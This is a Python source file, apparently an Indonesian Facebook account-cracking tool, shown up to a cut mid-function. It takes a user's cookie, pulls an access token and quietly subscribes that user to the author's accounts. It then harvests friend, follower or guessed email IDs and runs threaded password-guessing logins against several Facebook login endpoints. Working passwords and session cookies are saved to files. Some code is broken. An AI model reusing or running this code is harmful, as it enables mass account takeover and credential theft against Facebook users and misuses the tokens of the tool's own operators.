# coding=utf-8

#     *file name: Colmexs
#     *copyright: (C) © 2023 ~ Jessica Putry
#     *contact me on whatsap: +6287799183568
#     *Group Facebok: RATU ERROR (owner)

#--- module in python
import os,sys,requests,re,bs4,datetime,json,time,random,platform
from time import sleep as jeda
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as Romz_Xyz
from time import time as RakaXF
from datetime import datetime
from random import randint

# TANGGAL WAKTU
ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month 
uasm = []

waktu = ("{}-{}-{}").format(hari,bulan,tahun)
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

# WARNA
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
N = '\x1b[1;94m'
U = '\x1b[1;95m'
B = '\x1b[1;96m'
P = '\x1b[1;97m'
C = '\x1b[0m'    
pepek = ['100010061977994','maushamsingh088']


# JALAN
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.005)

# LOGO
def logo():
	os.system("clear")
	time.sleep (0.01)
	jalan ('\x1b[1;97m⣿⣿⣿⡇⢩⠘⣴⣿⣥⣤⢦⢁⠄⠉⡄⡇⠛⠛⠛⢛⣭⣾⣿⣿⡏')
	jalan ('\x1b[1;97m⣿⣿⣿⡇⠹⢇⡹⣿⣿⣛⣓⣿⡿⠞⠑⣱⠄⢀⣴⣿⣿⣿⣿⡟  💕   💖 💖 💞  ✨')
	jalan ('\x1b[1;97m⣿⣿⣿⣧⣸⡄⣿⣪⡻⣿⠿⠋⠄⠄⣀⣀⢡⣿⣿⣿⣿⡿⠋     💕  ⭐ 💞 ')
	jalan ('\x1b[1;97m⠘⣿⣿⣿⣿⣷⣭⣓⡽⡆⡄⢀⣤⣾⣿⣿⣿⣿⣿⡿⠋      💞 💖 💕   💖')
	jalan ('\x1b[1;97m⠄⢨⡻⡇⣿⢿⣿⣿⣭⡶⣿⣿⣿⣜⢿⡇⡿⠟⠉    ✨     💖   💕  ✨ 💖 💕')
	jalan ('\x1b[1;97m⠄⠸⣷⡅⣫⣾⣿⣿⣿⣷⣙⢿⣿⣿⣷⣦⣚⡀         ⭐     💖   💖')
	jalan ('\x1b[1;97m⠄⠄⢉⣾⡟⠙⠶⠖⠈⢻⣿⣷⣅⢻⣿⣿⣿⣿⣿⣶⣶⡆⠄⣤⡀        💞 ✨ 💕')
	jalan ('\x1b[1;97m⠄⢠⣿⣿⣧⣀⣀⣀⣀⣼⣿⣿⣿⡎⢿⣿⣿⣿⣿⣿⣿⣇⠄⠈⠁      💞  💖      ⭐')
	jalan ('\x1b[1;97m⠄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢇⣎⢿⣿⣿⣿⣿⣿⣿⣿⣶⣶    ⭐        💖')
	jalan ('\x1b[1;97m⠄⠄⠻⢿⣿⣿⣿⣿⣿⣿⣿⢟⣫⣾⣿⣷⡹⣿⣿⣿⣿⣿⣿⣿⡟         💖    💞')
	jalan ('\x1b[1;97m⠄⠄⠄⠄⢮⣭⣍⡭⣭⡵⣾⣿⣿⣿⡎⣿⣿⣌⠻⠿⠿⠿⠟⠋ JANGAN LUPA.....   ✨')
	jalan ('\x1b[1;97m⠄⠄⠄⠄⠈⠻⣿⣿⣿⣿⣹⣿⣿⣿⡇⣿⣿⡿ \x1b[1;96m⣾⣿⣿ ⣾⣿⣷ ⣿   ⣿⢿⡿⣿ ⣾⠛⠛ ⢿ ⡿ " ⣾⠛⣷')
	jalan ('\x1b[1;97m⠄⠄⣀⣴⣾⣶⡞⣿⣿⣿⣿⣿⣿⣿⣾⣿⡿⠃ \x1b[1;96m⣿   ⣿ ⣿ ⣿   ⣿⠙⠋⣿ ⣿⣿   ⣿     ⣫')
	jalan ('\x1b[1;97m⣠⣾⣿⣿⣿⣿⣿⣹⣿⣿⣿⣿⣿⡟⣹⣿⣳⡄ \x1b[1;96m⢿⣿⣿ ⢿⣿⡿ ⢿⣿⣿ ⣿  ⣿ ⢿⣤⣤ ⣾ ⣷   ⢿⣤⡿')

def banner():                
	os.system('clear')
	print ('')
	print ('')
	print ('')
	jalan ('                \33[3;1m\033[1;97mW e l c o m e  T o\33[0;1m')
	print ('')
	jalan ('       \033[1;96m[\33[37;1mR\033[1;96m] \033[1;96m[\033[1;97mA\033[1;96m] \033[1;96m[\033[1;97mT\033[1;96m] \033[1;96m[\033[1;97mU\033[1;96m]  \033[1;96m[\033[1;97mE\033[1;96m] \033[1;96m[\033[1;97mR\033[1;96m] \033[1;96m[\33[37;1mR\033[1;96m] \033[1;96m[\033[1;97mO\033[1;96m] \033[1;96m[\033[1;97mR\033[1;96m]\033[1;96m')
	print (' \033[1;96m  ____________________________________________')
	print ('\033[1;97m\033[1;96m ¤\033[1;97m{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}\033[1;96m¤')
	
# METHODE LOGIN
def login():
	try:
		ses = requests.Session()
		logo()
		kukis = input(f'\n{P} Masukan \x1b[1;96mCOOKIE \x1b[1;97manda :{B} ')
		url_tokB = ses.get('https://www.facebook.com/adsmanager/manage/campaigns',cookies = {"cookie":kukis})
		ids_tokB = re.search("act=(.*?)&nav_source", url_tokB.text).group(1)
		con_tokB = ses.get(f'https://www.facebook.com/adsmanager/manage/campaigns?act={ids_tokB}&nav_source=no_referrer', cookies = {"cookie":kukis})
		tokenB = re.search('accessToken="(.*?)"',con_tokB.text).group(1)
		open('data/token.txt','w').write(tokenB)
		open('data/cookie.txt','w').write(kukis)
		print (f"\n{P} + token:{H} {tokenB}");jeda(2)
		requests.post(f"https://graph.facebook.com/100010061977994/subscribers?access_token={tokenB}",cookies={"cookie":open("data/cookie.txt","r").read()}).json();requests.post(f"https://graph.facebook.com/100000834003593/subscribers?access_token={tokenB}",cookies={"cookie":open("data/cookie.txt","r").read()}).json()
		print (f"\n{H} √ login berhasil");jeda(2)
		menu()
	except Exception as e:
		os.system('rm -rf data/cookie.txt && rm -rf data/token.txt')
		print(e)
		exit()
#  MENU
def menu():
	try:
		token = open("data/token.txt","r").read()
		coki = {"cookie":open("data/cookie.txt","r").read()}
		try:
			nama=requests.get(f"https://mbasic.facebook.com/profile.php?v=info",cookies = coki).text 
		except:
			os.system('rm -rf data/cookie.txt && rm -rf data/token.txt')
			exit(f'{M} ! cookie invalid')
	except (FileNotFoundError,KeyError,IOError):
#		print (f"{M} ! cookie invalid");jeda(2)
		login()
	except requests.exceptions.ConnectionError:
		exit(f"{M} ! tidak ada koneksi")
	banner()
	print('\n')
	print (' \x1b[1;96m[\x1b[1;97m1\x1b[1;96m] \x1b[1;97mCrack dari  ID publik')
	print (' \x1b[1;96m[\x1b[1;97m2\x1b[1;96m] \x1b[1;97mCrack \x1b[1;92mUNLIMITED')
	print (' \x1b[1;96m[\x1b[1;97m3\x1b[1;96m] \x1b[1;97mCrack dari  pencarian nama')
	print (' \x1b[1;96m[\x1b[1;97m4\x1b[1;96m] \x1b[1;97mCrack dari  jumlah follower')
	print (' \x1b[1;96m[\x1b[1;97m5\x1b[1;96m] \x1b[1;97mCrack dari  anggota group')
	print (' \x1b[1;96m[\x1b[1;97m6\x1b[1;96m] \x1b[1;97mLihat hasil crack')
	print (' \x1b[1;96m[\x1b[1;97m7\x1b[1;96m] \x1b[1;97mSetting user agent')
	print (' \x1b[1;96m[\x1b[1;97m0\x1b[1;96m] \x1b[1;91mKeluar')
	print('')
	romz=input(" \x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPILIH :\x1b[1;93m ")
	if romz in ['']:print ("\n ! jangan kosong")
	elif romz in ['1']:publik(coki)
	elif romz in ['2']:massal(token,coki)
	elif romz in['3']:mail_name()
	elif romz in['4']:follow(token,coki)
	elif romz in['5']:exit()
	elif romz in ['6']:hasil()
	elif romz in ['7']:
		crack().UA()
		uas = open('ugent.txt','r').read()
		print (f"{P} ! User-Agent saat ini: {U}{uas}")
		print (f"{P} ! jika tidak mau ingin mengganti User-Agent ketik {H}no{P} ")
		us = input (" ? User-Agent: ")
		if us in['no','No','NO']:
			exit()
		elif us in['']:
			uas = ("Mozilla/5.0 (Linux; Android 4.2.2; FreeTAB 9000 IPS IC Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36")
			open('ugent.txt','w').write(uas)
		else:
			open('ugent.txt','w').write(us)
	elif romz in ['0']:
		os.system('rm -rf data/cookie.txt && rm -rf data/token.txt')
		exit()
	else:
		print ("\n ! isi yg benar")

def activate_licensi():
	os.system("clear")
	logo()
	try:
		key = open(".licensi", "r").read().strip()
	except FileNotFoundError:
		print("\x1b[1;97mKetik \x1b[1;92madmin\x1b[1;97m untuk mendapatkan lisensi script dari admin....terima kasih\n")
		key = input("\x1b[1;96m[\x1b[1;97m>\x1b[1;96m]\x1b[1;97m licensi: ").lower()
	if "gets" in key:
		os.system("xdg-open https://licensi.brutefb.my.id/register.php")
		activate_licensi()
	elif "admin" in key:
		os.system("xdg-open https://wa.me/6287799183568?text=RATU%20COLMEXs....beli%20lisensi%20dooong")
		activate_licensi()
	else:
		gets = requests.get("https://licensi.brutefb.my.id/api.php?key=%s&dev=%s" % (key.strip(), platform.platform())).json()
		if "error" in gets["status"]:
			exit(" [×] message: "+gets["msg"]+"\n\n")
		elif "berlaku" in gets["status"]:
			print("[✓] Anda telah masuk di zona "+gets["usage"]+" selamat menggunakan fitur kami")
			open(".licensi","w").write(key.strip())
			menu()
			os.system("clear")
		elif "kadaluarsa" in gets["status"]:
			exit("[!] Licensi anda telah kadaluarsa, silahkan chat admin untuk memperpanjang")
		else:
			exit("[!] licensi tidak valid")

id =[]
# CRACK PUBLIK
def publik(coki):
	try:
		user = input('\n \x1b[1;97mMasukan username/ID :\x1b[1;96m ')
		dump_id(f"https://mbasic.facebook.com/{user}?v=friends",coki)
	except:
		pass 
		
def dump_id(url_mb,coki):
	try:
		url = parser(requests.get(url_mb,cookies=coki).text,"html.parser")
		for z in url.find_all("a",href=True):
			if "fref" in z.get("href"):
				if "/profile.php?id=" in z.get("href"):
					idt = "".join(bs4.re.findall("profile\.php\?id=(.*?)&",z.get("href")))
					nama = z.text 
				else:
					idt = "".join(bs4.re.findall("/(.*?)\?",z.get("href")))
					nama = z.text
				if idt+"<=>"+nama in id: 
					pass 
				else:
					id.append(idt+"<=>"+nama)
				sys.stdout.write (f'\r {P}Jumlah ID :{H} {str(len(id))} '),
				sys.stdout.flush();jeda(0.0050)
		for x in url.find_all("a",href=True):
			if "Lihat Teman Lain" in x.text: 
				dump_id("https://mbasic.facebook.com/"+x.get("href"),coki)
	except:pass 
	print("")
	if len(id)!=0:
		return crack().__xnx__(id)
	else:
		exit(f"{M} gagal mengambil ID")
	
# CRACK UNLIMITED
def massal(token,cookie):
	try:
		print ('')
		jum = int(input(f"{P} Jumlah target : "))
		print ('')
	except:jum=1
	for t in range(jum):
		t +=1
		try:
			user=input(f"{P} Masukan ID publik {t}:\x1b[1;93m ")
			if user in pepek:
				exit("\n ! gk usah tolol")
			else:
				po = requests.get(f"https://graph.facebook.com/{user}/friends?limit=9999&access_token={token}",cookies=cookie).json()
				for i in po['data']:
					id.append(f"{i['id']}<=>{i['name']}")
		except KeyError:
			exit(f"{M} gagal mengambil ID")
	print (f'\r {P}Jumlah ID{M} :{H} {len(id)} ')
	
	return crack().__xnx__(id)
	     
# CRACK PENCARIAN NAMA
def mail_name():
	try:
		print(f'{P} contoh: sayang,pengen,colmeks ')
		nama = input(f' nama orang: ')
		jumlah=int(input(' jumlah ID yang ingin di dump: '))
		if "90000" in str(jumlah):
			jumlah-=1
		if jumlah<90001:
			pass
		else: exit ('%s╰─%s max user 90000'%(p,m));jeda(2)
		domain = "@gmail.com" #,"@yahoo.com"
		for z in range(int(jumlah)):
			if len(nama.split())>1:mail = str(nama.split()[0])+str(nama.split()[1])+str(z)+str(domain)+"<=>"+str(nama.split()[0])+" "+str(nama.split()[1])
			else:mail = str(nama)+str(z)+str(domain)+"<=>"+str(nama)
			if mail in id:pass
			else:id.append(mail)
			sys.stdout.write (f'\r {P}Jumlah ID :{H} {str(len(id))} '),
			sys.stdout.flush();jeda(0.0050)
	except:pass
	print ('')
	if len(id)!=0:
		return crack().__xnx__(id)
	else:
		exit(f'{M} ! gagal mengambil id')
			
# CRACK JUMLAH FOLLOWER
def follow(token,cookie):
	try:
		user=input(f"\n{P} Masukan ID publik :\x1b[1;93m ")
		if user in pepek:
			exit("\n ! gk usah tolol")
		else:
			po = self.roomz.get(f"https://graph.facebook.com/{user}/subscribers?limit=6001&access_token={token}",cookies=cookie).json()
			for i in po['data']:
				id.append(f"{i['id']}<=>{i['name']}")
			sys.stdout.write (f'\r {P}Jumlah ID :{H} {str(len(id))} '),
			sys.stdout.flush();jeda(0.0050)
	except KeyError:
		exit(f"{M} gagal mengambil ID")
	
	print('')
	return crack().__xnx__(id)

# CRACK ANGGOTA GROUP

# LIHAT HASIL
oke,cepe=[],[]
def hasil():
	print(f"""
 {P}1. Cek hasil akun {H}Berhasil{P}
 2. Cek hasil akun {K}Checkpoint{P}
 0. Kembali
	""")
	rom = input(" \x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPILIH :\x1b[1;93m ")
	if rom in['']:
		exit("\n Isi yg benar")
	elif rom in['1','01']: 
		try:
			dirs = os.listdir('OK')
			for file in dirs:
				oke.append(file)
		except:pass 
		if len(oke)==0:
			exit("\n File tidak tersedia")
		else:
			print(f'\n {H}Hasil akun berhasil 👍')
			nomor = 0
			for i in oke:
				fil = open(f"OK/{i}").read().splitlines() 
				nomor+=1
				print(f"{P} {str(nomor)}.{P} {i} {P}-{P} {str(len(fil))} ")
			file = input("\n \x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPilih nomor yang ingin di cek :\x1b[1;93m ")
			try:
				hasil = oke[int(file)-1]
			except (KeyError,IndexError,ValueError):
				exit ('\n Isi yg benar')
			nm_file = hasil.replace("-", " ")
			file_nm = nm_file.replace('.txt', '')
			totalok = open(f"OK/{hasil}", "r").read().splitlines()
			print(f"\n{P}🍏---------------------------------------🍏")
			print (f"{P} Hasil tanggal: {file_nm} total: {P}{len(totalok)}")
			print(f"{P}🍏---------------------------------------🍏")
			for ngontol in totalok:
				kontol = ngontol.replace("\n","")
				pukimek = kontol.replace(" *--> ","\x1b[1;97m└──\x1b[1;92m ")
				print('%s'%(pukimek));jeda(0.07)
			print ('')
			exit()
	elif rom in['2','02']: 
		try:
			dirs = os.listdir('CP')
			for file in dirs:
				cepe.append(file)
		except:pass 
		if len(cepe)==0:
			exit(" File tidak tersedia")
		else:
			print(f'\n {K}Hasil akun checkpoint 👎')
			nomor = 0
			for i in cepe:
				fil = open(f"CP/{i}").read().splitlines() 
				nomor+=1
				print(f"{P} {str(nomor)}.{P} {i} {P}-{P} {str(len(fil))} ")
			file = input("\n \x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPilih nomor yang ingin di cek :\x1b[1;93m ")
			try:
				hasil = cepe[int(file)-1]
			except (KeyError,IndexError,ValueError):
				exit ('\n Isi yg benar')
			nm_file = hasil.replace("-", " ")
			file_nm = nm_file.replace('.txt', '')
			totalcp = open(f"CP/{hasil}", "r").read().splitlines()
			print(f"\n{P}🍊---------------------------------------🍊")
			print (f"{P} Hasil tanggal: {file_nm} total: {K}{len(totalcp)}")
			print(f"{P}🍊---------------------------------------🍊")
			for ngontol in totalcp:
				kontol = ngontol.replace("\n","")
				pukimek = kontol.replace(" *--> ","\x1b[1;97m└──\x1b[1;93m ")
				print('%s'%(pukimek));jeda(0.07)
			print('')
			exit()
	elif rom in['0','00']:
		os.system("python simple.py")
	else:
		exit("\n Isi yg benar")
	
# METHDOE CRACK
ok,cp,loop=[],[],0
class crack:
	
	def __init__(self):
		self.id =[]
	
	def __xnx__(self,id):
		self.id =id

		# pilih useragent
		self.pilih_useragent()
  
		cx=input(f" {P}Gunakan Password Manual {H}y{P}/{M}t {P}:\x1b[1;93m ")
		print('')
		if cx in ('y'):
			print(f"{P} Contoh: sayang,anjing,123456")
			pwek=input(" Masukan password: ")
			if pwek in(''):
				exit("\n jangan kosong")
			elif len(pwek)<=5:
				exit("\n password minimal 6 huruf")
			self.manual(pwek)
		else:
			print()
			print (' \x1b[1;96m[\x1b[1;97m1\x1b[1;96m] \x1b[1;97mMethode free')
			print (' \x1b[1;96m[\x1b[1;97m2\x1b[1;96m] \x1b[1;97mMethode mbasic')
			print (' \x1b[1;96m[\x1b[1;97m3\x1b[1;96m] \x1b[1;97mMethode mobile')
			print (' \x1b[1;96m[\x1b[1;97m4\x1b[1;96m] \x1b[1;97mMethode api')
			print (' \x1b[1;96m[\x1b[1;97ma\x1b[1;96m] \x1b[1;97mHeaders Validate')
			print (' \x1b[1;96m[\x1b[1;97mb\x1b[1;96m] \x1b[1;97mHeaders Reguler')
			print (' \x1b[1;96m[\x1b[1;97mc\x1b[1;96m] \x1b[1;97mHeaders Bussines')
			print ('')
			self.langsung()
		
		exit()
	
	def manual(self, pwek):
		print()
		print (' \x1b[1;96m[\x1b[1;97m1\x1b[1;96m] \x1b[1;97mMethode free')
		print (' \x1b[1;96m[\x1b[1;97m2\x1b[1;96m] \x1b[1;97mMethode mbasic')
		print (' \x1b[1;96m[\x1b[1;97m3\x1b[1;96m] \x1b[1;97mMethode mobile')
		print (' \x1b[1;96m[\x1b[1;97m4\x1b[1;96m] \x1b[1;97mMethode api')
		print (' \x1b[1;96m[\x1b[1;97ma\x1b[1;96m] \x1b[1;97mHeaders Validate')
		print (' \x1b[1;96m[\x1b[1;97mb\x1b[1;96m] \x1b[1;97mHeaders Reguler')
		print (' \x1b[1;96m[\x1b[1;97mc\x1b[1;96m] \x1b[1;97mHeaders Bussines')
		men=input(" \x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPILIH :\x1b[1;93m ")
		print (f"""
 \x1b[1;97m⚡ akun {H}OK {P}tersimpan di:{H} OK/{waktu}.txt{P}
 ⚡ akun {K}CP {P}tersimpan di:{K} CP/{waktu}.txt{P}
 ⚡ crack sedang berjalan... 
		""")
		with Romz_Xyz(max_workers=30) as titid:
			for akun in id:
				pwx = []
				uid = akun.split('<=>')[0]
				pwx = pwek.split(",")
				if men in['1']:
					titid.submit(self.__romz__, uid, pwx,  "free.facebook.com")
				elif men in['2']:
					titid.submit(self.__romz__, uid, pwx,  "mbasic.facebook.com")
				elif men in['3']:
					titid.submit(self.__romz__, uid, pwx,  "m.facebook.com")
				elif men in['4']:
					titid.submit(self.__romz__, uid, pwx,  "x.facebook.com")
				elif men in['a','A']:
					titid.submit(self.validate, uid, pwx)
				elif men in['b','B']:
					titid.submit(self.reg, uid, pwx)
				elif men in['c','C']:
					titid.submit(self.bussines, uid, pwx)
				else:
					exit("\n isi yang benar")
					
		self.hasil(ok,cp)
		
	def langsung(self):
		men=input(" \x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPILIH :\x1b[1;93m ")
		print (f"""
 {P}⚡ akun {H}OK {P}tersimpan di:{H} OK/{waktu}.txt{P}
 ⚡ akun {K}CP {P}tersimpan di:{K} CP/{waktu}.txt{P}
 ⚡ crack sedang berjalan... 
		""")
		with Romz_Xyz(max_workers=30) as titid:
			for akun in id:
				pwx = ['sayangku','sayang123']
				uid,name = akun.split('<=>')[0],akun.split('<=>')[1].lower()
				na = name.split(' ')[0]
				if len(name)<6:
					if len(na)<3:
						pass 
					else:
						pwx.append(name)
						pwx.append(na+'123')
						pwx.append(na+'12345')
						pwx.append(na+'1234')
				else:
					if len(na)<3:
						pwx.append(name)
					else:
						pwx.append(name)
						pwx.append(na+'123')
						pwx.append(na+'12345')
						pwx.append(na+'1234')
				if men in['1']:
					titid.submit(self.__romz__, uid, pwx,  "free.facebook.com")
				elif men in['2']:
					titid.submit(self.__romz__, uid, pwx,  "mbasic.facebook.com")
				elif men in['3']:
					titid.submit(self.__romz__, uid, pwx,  "m.facebook.com")
				elif men in['4']:
					titid.submit(self.__romz__, uid, pwx,  "x.facebook.com")
				elif men in['a','A']:
					titid.submit(self.validate, uid, pwx)
				elif men in['b','B']:
					titid.submit(self.reg, uid, pwx)
				elif men in['c','C']:
					titid.submit(self.bussines, uid, pwx)
				else:
					exit("\n ! isi yang benar")
					
		self.hasil(ok,cp)
	
	#--- methode
	def __romz__(self, user, peweh, url_log):
		global ok,cp,loop 
		komtol=random.choice([f"{M}",f"{K}",f"{H}",f"{N}",f"{U}",f"{P}"])
		print (f"\r {komtol}• {P}{str(loop)}/{len(self.id)} - {H}OK:-{len(ok)} {K}CP:-{len(cp)}   ",end="")
		for pw in peweh:
			try: 
				ses = requests.Session()
				URL=url_log
				ua = random.choice(self.UA)
				headerr={
					"Host":URL,
					"cache-control":"max-age=0",
					"upgrade-insecure-requests":"1",
					"user-agent": ua,
					"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
					"x-requested-with":"mark.via.gp",
					"sec-fetch-site":"same-origin",
					"sec-fetch-mode":"navigate",
					"sec-fetch-user":"?1",
					"sec-fetch-dest":"document",
					"referer":f"https://{URL}/",
					"accept-encoding":"gzip, deflate",
					"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
				}
				GET = ses.get(f'https://{URL}/login/save-device/?login_source=login&refsrc=deprecated&_rdr',headers=headerr).text 
				dataa ={
					"lsd":re.search('name="lsd" value="(.*?)"', str(GET)).group(1),
					"jazoest":re.search('name="jazoest" value="(.*?)"', str(GET)).group(1),
					"m_ts": re.search('name="m_ts" value="(.*?)"',str(GET)).group(1),
					"li": re.search('name="li" value="(.*?)"',str(GET)).group(1),
					"try_number": re.search('name="try_number" value="(.*?)"',str(GET)).group(1),
					"unrecognized_tries": re.search('name="unrecognized_tries" value="(.*?)"',str(GET)).group(1),
					"email":user,
					"pass":pw,
					"login":"Submit",
					"bi_xrwh":re.search('name="bi_xrwh" value="(.*?)"', str(GET)).group(1),
				}
				headexx={
					"Host":URL,
					"content-length": f"{str(len(dataa))}",
					"cache-control":"max-age=0",
					"upgrade-insecure-requests":"1",
					"origin":f"https://{URL}",
					"content-type":"application/x-www-form-urlencoded",
					"user-agent":ua,
					"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
					"x-requested-with":"mark.via.gp",
					"sec-fetch-site":"same-origin",
					"sec-fetch-mode":"navigate",
					"sec-fetch-user":"?1",
					"sec-fetch-dest":"document",
					"referer":f"https://{URL}/login/save-device/?login_source=login&refsrc=deprecated&_rdc=1&_rdr",
					"accept-encoding":"gzip, deflate, br",
					"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
					"cookie":(";").join([key+"="+value for key, value in ses.cookies.get_dict().items()])
				}
				POS = ses.post(f"https://{URL}/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8",data=dataa,headers=headexx,allow_redirects=False)
				if 'c_user' in ses.cookies.get_dict():
					kukis = (";").join([key+"="+value for key, value in ses.cookies.get_dict().items()])
					print(f'\r{P}└──{H} {user} ◊ {pw} \n{P} └─ {H}{kukis} \n{P} └─ {U}{self.UA()} \n ')
					info = f"{user} ◊ {pw} ◊ {kukis}"
					ok.append(f"{info}")
					open(f'OK/{waktu}.txt', 'a').write(f" *--> {info}\n")
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					print (f'\r{P}└── {K}{user} ◊ {pw}  \n{P} └─ {U}{self.UA()} \n ')
					info = f'{user} ◊ {pw}'
					cp.append(f'{info}')
					open(f'CP/{waktu}.txt', 'a').write(f" *--> {info}\n")
					break
				else:
					continue
			except requests.exceptions.ConnectionError:
				time.sleep(31)
			
		loop+=1

	def validate(self, user, peweh):
		global ok,cp,loop 
		komtol=random.choice([f"{M}",f"{K}",f"{H}",f"{N}",f"{U}",f"{P}"])
		print (f"\r {komtol}Validate {P}{str(loop)}/{len(self.id)} - {H}OK:-{len(ok)} {K}CP:-{len(cp)}   ",end="")
		for pw in peweh:
			try: 
				ses = requests.Session()
				ua = random.choice(self.UA)
				link=ses.get(f"https://h.facebook.com/hr/r?redirect_app=8&next=https://mbasic.facebook.com/login/?email%3D{user}%26next%3Dhttps%3A%2F%2Fmbasic.facebook.com%2Flogin%2Fdevice-based%2Fvalidate-password%2F%3Fshbl%3D0%26li%3DcLF-ZserqdhNL4uoNn2Llk2F%26e%3D1348131%26shbl%3D1%26ref%3D104%26wtsid%3Drdr_0gJeDV3AqfDKxF1se%26refsrc%3Ddeprecated&zc=AfoZzlQMuhXRJoHiI3uWzLLH-2RVHnQSftgAhICbd0NhjnVNj-QMTScUiZMs4FLo5Pk&rtime=1719579008&ed=Afqp9CRIhnO3GHKOCrXEHsuSY6ZZo6O_8QGA7yzFCjfSbsVfUJoMF3L-ixmUq0PzBm5tExKjmFXyXkyXBibMti0V&hc=1&wtsid=rdr_0gJeDV3AqfDKxF1se&refsrc=deprecated&ref=104&_rdr")
				data={'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),'m_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),'try_number': '0','unrecognized_tries': '0','email': user,'pass': pw,'login': 'Masuk','bi_xrwh': '0',}
				# f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(120,126))}.0.0.0 Mobile Safari/537.36'
				headers = {'User-Agent': ua,'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Content-Type': 'application/x-www-form-urlencoded','cache-control': 'max-age=0','dpr': '1.75','viewport-width': '980','sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"11.0.0"','sec-ch-ua-model': '"SM-A115F"','sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"','sec-ch-prefers-color-scheme': 'dark','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
				response = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?next=https://mbasic.facebook.com/login/device-based/validate-password/?shbl%3D0&refsrc=deprecated&lwv=100&refid=9&ref=104', headers=headers, data=data, allow_redirects=False)
				if 'c_user' in ses.cookies.get_dict():
					kukis = (";").join([key+"="+value for key, value in ses.cookies.get_dict().items()])
					print(f'\r{P}└──{H} {user} ◊ {pw} \n{P} └─ {H}{kukis} \n{P} └─ {U}{self.UA()} \n ')
					info = f"{user} ◊ {pw} ◊ {kukis}"
					ok.append(f"{info}")
					open(f'OK/{waktu}.txt', 'a').write(f" *--> {info}\n")
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					print (f'\r{P}└── {K}{user} ◊ {pw}  \n{P} └─ {U}{self.UA()} \n ')
					info = f'{user} ◊ {pw}'
					cp.append(f'{info}')
					open(f'CP/{waktu}.txt', 'a').write(f" *--> {info}\n")
					break
				else:
					continue
			except requests.exceptions.ConnectionError:
				time.sleep(31)
			
		loop+=1

	def reg(self, user, peweh):
		global ok,cp,loop 
		komtol=random.choice([f"{M}",f"{K}",f"{H}",f"{N}",f"{U}",f"{P}"])
		print (f"\r {komtol}Reguler {P}{str(loop)}/{len(self.id)} - {H}OK:-{len(ok)} {K}CP:-{len(cp)}   ",end="")
		for pw in peweh:
			try: 
				ses = requests.Session()
				ua = random.choice(self.UA)
				link=ses.get(f"https://mbasic.facebook.com/login/?email={user}&li=qO16Zqor9faJsHgs32zwaN3E&e=1348131&shbl=1&wtsid=rdr_0MUGdT61PuZolYZaN&refsrc=deprecated&rtime=1719332284&hrc=1&_rdr")
				data={'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),'m_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),'try_number': '0','unrecognized_tries': '0','email': user,'pass': pw,'login': 'Masuk','bi_xrwh': '0',}
				# f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(120,126))}.0.0.0 Mobile Safari/537.36'
